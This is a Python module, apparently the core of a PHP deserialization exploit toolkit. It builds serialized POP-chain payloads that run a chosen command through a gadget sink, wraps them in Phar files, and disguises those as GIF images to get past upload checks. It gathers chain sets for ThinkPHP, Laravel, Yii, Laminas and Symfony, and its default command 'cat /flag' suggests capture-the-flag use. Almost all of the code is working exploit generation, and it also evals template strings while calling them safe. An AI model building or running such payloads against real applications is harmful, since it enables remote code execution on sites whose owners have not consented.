"""POP chain template library for PHP deserialization exploits."""
from __future__ import annotations

import hashlib
import struct
from dataclasses import dataclass
from typing import List


# ---------------------------------------------------------------------------
# PHP serialization helpers (safe for eval in POPChain context)
# These construct PHP serialized format byte by byte without needing PHP runtime.
#   PHP format:  s:<len>:"<string>";  O:<len>:"<class>":<n>:{<props>}  a:<n>:{<kv>}
#   Private prop: \x00ClassName\x00propName
#   Protected prop: \x00*\x00propName
# ---------------------------------------------------------------------------

def _s(val: bytes | str) -> bytes:
    """PHP s:<len>:"<val>";"""
    b = val if isinstance(val, bytes) else val.encode("utf-8")
    return b"s:" + str(len(b)).encode() + b":\"" + b + b"\";"


def _i(val: int) -> bytes:
    """PHP i:<val>;"""
    return b"i:" + str(val).encode() + b";"


def _b(val: bool) -> bytes:
    """PHP b:1; or b:0;"""
    return b"b:1;" if val else b"b:0;"


def _N() -> bytes:
    """PHP N; (null)."""
    return b"N;"


def _O(classname: str | bytes, prop_count: int, props: bytes) -> bytes:
    """PHP O:<len>:"<class>":<prop_count>:{<props>}"""
    c = classname if isinstance(classname, bytes) else classname.encode("utf-8")
    return (
        b"O:" + str(len(c)).encode() + b":\"" + c + b"\":" +
        str(prop_count).encode() + b":{" + props + b"}"
    )


def _a(count: int, flat: bytes) -> bytes:
    """PHP a:<count>:{<flat_kv_bytes>} — count is explicit number of entries."""
    return b"a:" + str(count).encode() + b":{" + flat + b"}"


def _e(key: bytes, value: bytes) -> bytes:
    """A single array entry: key + value (PHP key;value; pair)."""
    return key + value


def _protected(name: str | bytes) -> bytes:
    """PHP protected property: \x00*\x00<name>"""
    n = name if isinstance(name, bytes) else name.encode("utf-8")
    return b"\x00*\x00" + n


def _private(cls: str | bytes, name: str | bytes) -> bytes:
    """PHP private property: \x00<ClassName>\x00<name>"""
    c = cls if isinstance(cls, bytes) else cls.encode("utf-8")
    n = name if isinstance(name, bytes) else name.encode("utf-8")
    return b"\x00" + c + b"\x00" + n


# Helpers available in eval context
_SAFE_BUILTINS = {
    "bytes": bytes,
    "str": str,
    "int": int,
    "len": len,
    "_s": _s,
    "_i": _i,
    "_b": _b,
    "_N": _N,
    "_O": _O,
    "_a": _a,
    "_e": _e,
    "_protected": _protected,
    "_private": _private,
}


@dataclass
class POPChain:
    name: str
    framework: str
    gadget_classes: List[str]
    entry_point: str       # e.g. "__destruct"
    sink: str              # e.g. "system(...)", "eval(...)"
    command_param: str     # e.g. "param_name" or positional
    serialize_code: str    # Python expression yielding bytes (uses _s/_O/_a helpers)
    notes: str = ""
    php_version_req: str = ""  # e.g. "<8.0"

    def generate_serialize(self, command: str = "cat /flag") -> bytes:
        """Generate the serialized PHP payload bytes for a given command."""
        ctx = {"__command__": command}
        try:
            result = eval(self.serialize_code, _SAFE_BUILTINS, ctx)
            if isinstance(result, str):
                return result.encode("latin-1")
            if isinstance(result, bytes):
                return result
            return str(result).encode("latin-1")
        except Exception:
            # Fallback: treat code as raw bytes (simple Python bytes literal)
            try:
                return eval(self.serialize_code, {"__builtins__": {}}, ctx)
            except Exception:
                return self.serialize_code.encode("latin-1")

    def generate_phar(self, command: str = "cat /flag", alias: str = "test.jpg") -> bytes:
        """Generate a Phar file containing the serialized payload."""
        payload = self.generate_serialize(command)
        return build_phar(payload, alias=alias)

    def generate_phar_as_image(self, command: str = "cat /flag", alias: str = "test.gif") -> bytes:
        """Generate a Phar file disguised as an image (GIF header)."""
        payload = self.generate_serialize(command)
        phar = build_phar(payload, alias=alias)
        return b"GIF89a\x00\x00\x00" + phar[8:] if phar[:3] == b"\x00\x00\x00" else b"GIF89a\x00\x00\x00" + phar


def build_phar(serialized: bytes, alias: str = "test.txt") -> bytes:
    """Build a minimal but valid Phar file containing serialized metadata."""
    metadata = serialized
    alias_bytes = alias.encode("utf-8")
    stub = b"<?php __HALT_COMPILER(); ?>\r\n"
    manifest = b""
    manifest += struct.pack("<I", 0)    # file count = 0
    manifest += struct.pack("<H", 0x11) # API version 1.1
    manifest += struct.pack("<I", 0)    # flags
    manifest += struct.pack("<I", len(alias_bytes))
    manifest += alias_bytes
    manifest += struct.pack("<I", len(metadata))
    manifest += metadata
    manifest_blob = struct.pack("<I", len(manifest)) + manifest
    sig_data = stub + manifest_blob
    sig_hash = hashlib.sha1(sig_data).digest()
    signature = b"\x01\x00" + sig_hash
    if len(signature) < 28:
        signature += b"\x00" * (28 - len(signature))
    return stub + manifest_blob + signature


from .thinkphp import THINKPHP_CHAINS  # noqa: E402
from .laravel import LARAVEL_CHAINS  # noqa: E402
from .yii import YII_CHAINS  # noqa: E402
from .laminas import LAMINAS_CHAINS  # noqa: E402
from .symfony import SYMFONY_CHAINS  # noqa: E402
from .generic import GENERIC_CHAINS  # noqa: E402

ALL_CHAINS = THINKPHP_CHAINS + LARAVEL_CHAINS + YII_CHAINS + LAMINAS_CHAINS + SYMFONY_CHAINS + GENERIC_CHAINS

__all__ = [
    "POPChain",
    "build_phar",
    "ALL_CHAINS",
    "THINKPHP_CHAINS",
    "LARAVEL_CHAINS",
    "YII_CHAINS",
    "LAMINAS_CHAINS",
    "SYMFONY_CHAINS",
    "GENERIC_CHAINS",
]
